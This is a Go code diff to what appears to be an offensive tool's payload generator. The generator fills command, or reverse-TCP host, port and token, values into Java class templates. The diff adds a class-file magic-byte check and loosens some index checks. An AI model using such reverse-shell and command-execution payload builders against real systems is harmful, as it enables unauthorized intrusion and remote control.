@@ -17,17 +17,22 @@ func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 		uint16Size   = 2
 	)
 
+	err := checkJavaClass(template)
+	if err != nil {
+		return nil, err
+	}
+
 	// find three special strings
 	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
-	if fileNameIdx == -1 || fileNameIdx < 2 {
+	if fileNameIdx == -1 {
 		return nil, errors.New("failed to find file name in execute template")
 	}
 	commandIdx := bytes.Index(template, []byte(commandFlag))
-	if commandIdx == -1 || commandIdx < 2 {
+	if commandIdx == -1 {
 		return nil, errors.New("failed to find command flag in execute template")
 	}
 	classNameIdx := bytes.Index(template, []byte(className))
-	if classNameIdx == -1 || classNameIdx < 2 {
+	if classNameIdx == -1 {
 		return nil, errors.New("failed to find class name in execute template")
 	}
 
@@ -77,25 +82,30 @@ func GenerateReverseTCP(template []byte, host string, port uint16, token, class 
 		uint16Size   = 2
 	)
 
+	err := checkJavaClass(template)
+	if err != nil {
+		return nil, err
+	}
+
 	// find three special strings
 	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
-	if fileNameIdx == -1 || fileNameIdx < 2 {
+	if fileNameIdx == -1 {
 		return nil, errors.New("failed to find file name in reverse_tcp template")
 	}
 	hostIdx := bytes.Index(template, []byte(hostFlag))
-	if hostIdx == -1 || hostIdx < 2 {
+	if hostIdx == -1 {
 		return nil, errors.New("failed to find host flag in reverse_tcp template")
 	}
 	portIdx := bytes.Index(template, []byte(portFlag))
-	if portIdx == -1 || portIdx < 2 {
+	if portIdx == -1 {
 		return nil, errors.New("failed to find port flag in reverse_tcp template")
 	}
 	tokenIdx := bytes.Index(template, []byte(tokenFlag))
-	if tokenIdx == -1 || tokenIdx < 2 {
+	if tokenIdx == -1 {
 		return nil, errors.New("failed to find token flag in reverse_tcp template")
 	}
 	classNameIdx := bytes.Index(template, []byte(className))
-	if classNameIdx == -1 || classNameIdx < 2 {
+	if classNameIdx == -1 {
 		return nil, errors.New("failed to find class name in reverse_tcp template")
 	}
 
@@ -150,6 +160,16 @@ func GenerateReverseTCP(template []byte, host string, port uint16, token, class 
 
 	output.Write(template[classNameIdx+len(className)-1:])
 	return output.Bytes(), nil
+}
+
+func checkJavaClass(template []byte) error {
+	if len(template) < 4 {
+		return errors.New("invalid Java class template file size")
+	}
+	if !bytes.Equal(template[:2], []byte{0xCA, 0xFE}) {
+		return errors.New("invalid Java class template file")
+	}
+	return nil
 }
 
 func beUint16ToBytes(n uint16) []byte {
